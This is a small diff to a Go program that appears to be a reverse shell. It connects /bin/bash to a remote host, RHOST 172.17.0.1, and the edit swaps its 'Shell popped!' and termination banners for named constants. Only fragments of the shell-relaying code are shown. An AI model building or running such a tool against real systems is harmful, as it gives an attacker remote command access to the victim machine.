@@ -14,6 +14,9 @@ import (
 const RHOST = "172.17.0.1"
 const COMMAND = "/bin/bash"
 
+const MSG_HELLO = "\n----- SHELL STARTED -----\n"
+const MSG_BYE = "\n----- SHELL TERMINATED -----\n"
+
 var outQueue []byte
 var outQueueLock sync.Mutex
 
@@ -36,7 +39,7 @@ func main() {
 
 	subCmd.Start()
 
-	send([]byte("Shell popped!\n"), 14)
+	send([]byte(MSG_HELLO), len(MSG_HELLO))
 
 	go func() {
 		buf := make([]byte, 16)
@@ -62,7 +65,7 @@ func main() {
 
 	subCmd.Wait()
 
-	send([]byte("--- SHELL TERMINATED ---\n"), 25)
+	send([]byte(MSG_BYE), len(MSG_BYE))
 
 	for !sendDone {
 		time.Sleep(time.Second * 1)
